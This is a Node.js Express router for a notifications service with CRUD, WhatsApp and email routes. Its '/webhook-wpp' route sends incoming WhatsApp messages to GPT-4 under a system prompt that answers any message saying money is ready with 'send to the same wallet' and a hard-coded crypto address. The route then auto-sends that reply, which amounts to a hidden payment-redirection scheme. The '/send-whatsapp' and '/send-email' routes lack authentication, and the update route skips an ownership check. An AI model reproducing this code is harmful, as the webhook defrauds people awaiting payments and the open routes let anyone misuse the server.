const express = require('express');
const router = express.Router();
const NotificationsController = require('../controllers/NotificationsUser.controller');
const { response, sendGroupMessage, sendMessageMay } = require('../utils');
const auth = require('../middleware/auth');
const { NOTIFICATIONS } = require('../config');
const { sendGeneralEmail } = require('../controllers/email.controller');
const axios = require("axios");
const NotificationHistoryModel = require('../models/notificationHistory.model');
const authAdmin = require('../middleware/authAdmin');


router.get('/', auth, async (req, res) => {
    try {
        const notifications = await NotificationsController.getNotifications({ userId: req.user._id, status: { $nin: ["deleted"] } });
        res.status(200).json(response(notifications, 'success'));
    } catch (error) {
        res.status(200).json(response(error.message, 'error'));
    }
});
router.get('/getHistory/', authAdmin, async (req, res) => {
    try {
        let notification = await NotificationHistoryModel.find({}).sort({ createdAt: -1 });
        if (notification) {
            res.status(200).json(response(notification, 'success'));
        } else {
            res.status(200).json(response('Notification not found', 'error'));
        }
    } catch (error) {
        res.status(200).json(response(error.message, 'error'));
    }
});
router.get('/:id', auth, async (req, res) => {
    try {
        const notification = await NotificationsController.getOne({ _id: req.params.id, user: req.user._id, status: { $nin: ["deleted"] } });
        if (notification) {
            res.status(200).json(response(notification, 'success'));
        } else {
            res.status(200).json(response('Notification not found', 'error'));
        }
    } catch (error) {
        res.status(200).json(response(error.message, 'error'));
    }
});



router.put('/:id', auth, async (req, res) => {
    try {
        let { status } = req.body;
        const notification = await NotificationsController.updateNotification(req.params.id, { status: status });
        if (notification) {
            res.status(200).json(response(notification, 'success'));
        } else {
            res.status(200).json(response('Notification not found', 'error'));
        }
    } catch (error) {
        res.status(200).json(response(error.message, 'error'));
    }
});

router.post('/', auth, async (req, res) => {
    try {
        req.body.userId = req.user._id;
        const notification = await NotificationsController.createNotification(req.body);
        if (notification) {
            res.status(200).json(response(notification, 'success'));
        } else {
            res.status(200).json(response('Notification not found', 'error'));
        }
    } catch (error) {
        res.status(200).json(response(error.message, 'error'));
    }
});

// Función para enviar un mensaje a ChatGPT
const enviarMensajeAChatGPT = async (mensaje) => {
    const apiKey = process.env.OPEN_AI_KEY;
    const endpoint = 'https://api.openai.com/v1/chat/completions';
    const headers = {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${apiKey}`
    };
    const data = {
        model: 'gpt-4',
        messages: [
            {
                role: 'system',
                content: "I want you to respond in the same language as the incoming message only if the message is solely about an amount of money being ready. If the message explicitly states that an amount is ready, respond with 'Hello sir, send to the same wallet: TWNxsGw1o4rnP4FExQSEXuYzLtXm3dMkRd'  in the same language. If the message contains any other content, or if it's not clear that the money is ready, respond with 'Not found' in english"
            },
            { role: 'user', content: mensaje }
        ],
        max_tokens: 150
    };

    let respons = null;
    try {
        respons = await axios.post(endpoint, data, { headers });
        return respons.data.choices[0].message.content;
    } catch (error) {
        console.error(JSON.stringify(error), 'Error al enviar el mensaje a ChatGPT:');
        if (error?.data?.error) {
            console.log(error.data.error)
        }
        return "Not found";
    }
};
function containsNumber(text) {
    const regex = /\d/; // \d es un atajo para cualquier dígito (0-9)
    return regex.test(text);
}
// enviarMensajeAChatGPT("heello my friend").then(res=>console.log("res0",res))
router.post('/webhook-wpp', async (req, res) => {

    // console.log(req.body, "wpp - notification");
    if (req.body?.message?.text && req.body?.type == "message" && req.body?.message?.fromMe != true) {
        if (containsNumber(req.body.message.text)) {
            let ia = await enviarMensajeAChatGPT(req.body.message.text);
            console.log(ia);
            if (!ia.toLowerCase().includes("found") && !ia.toLowerCase().includes("no encontrado") && !ia.toLowerCase().includes("encontró") && !ia.toLowerCase().includes("no se enc")) {
                let newNotification = new NotificationHistoryModel({
                    message: ia,
                    type: 'whatsApp',
                    lineCode: "webhook-wpp",
                    from: "admin",
                    to: req.body.user.id,
                    status: 'sent'
                });
                try {
                    // console.log(req.body.conversation, ia)
                    await sendMessageMay(req.body.conversation, ia);
                    await newNotification.save()
                } catch (error) {
                    newNotification.error = error;
                    await newNotification.save()
                }
            }

        }
    }
    return res.status(200).json({ response: {}, status: "success" })
});


router.post('/send-whatsapp', async (req, res) => {
    try {
        const { message, number, groupId } = req.body;
        let resp = {};
        if (groupId != undefined) {
            resp = await sendGroupMessage(message);
        } else {
            resp = await sendMessageMay(number, message);
        }
        res.status(200).json(response(resp, 'success'));
    } catch (error) {
        console.error('Error al enviar el mensaje:', error);
        res.status(500).json(response('Error al enviar el mensaje', 'error'));
    }
});
router.post('/send-email', async (req, res) => {
    try {
        const { to, title, message, components } = req.body;
        await sendGeneralEmail(to, title, message, components)
        res.status(200).json(response("email sent", 'success'));
    } catch (error) {
        console.error('Error al enviar el email:', error);
        res.status(500).json(response('Error to send email', 'error'));
    }
});

// router.delete('/:id', async (req, res) => {
//     try {
//         const notification = await NotificationsController.deleteNotification(req.params.id);
//         if (notification) {
//             res.status(200).json(response('Notification deleted', 'success'));
//         } else {
//             res.status(200).json(response('Notification not found', 'error'));
//         }
//     } catch (error) {
//         res.status(200).json(response(error.message, 'error'));
//     }
// });

module.exports = router;
